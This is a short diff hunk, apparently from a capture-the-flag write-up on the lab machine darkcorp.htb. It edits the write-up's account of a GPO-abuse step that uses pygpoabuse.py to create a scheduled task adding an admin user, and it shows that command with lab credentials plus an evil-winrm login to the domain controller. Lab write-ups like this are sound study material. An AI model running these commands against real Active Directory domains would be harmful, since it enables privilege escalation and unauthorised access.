@@ -1363,7 +1363,7 @@ python3 pygpoabuse.py 'darkcorp.htb'/'taylor.b.adm':'!QAZzaq1' -gpo-id '652CAE9A
 [+] ScheduledTask TASK_f7202c64 created!
 ```
 
-Ill set the schedules task, this will create a admin user on the machine called `john` with the passw
+Ill set the schedules task, this will create a admin user on the machine called `john` with a password that can be found on the github page
 
 ```python
 evil-winrm -i dc-01.darkcorp.htb -u taylor.b.adm -p '!QAZzaq1'       
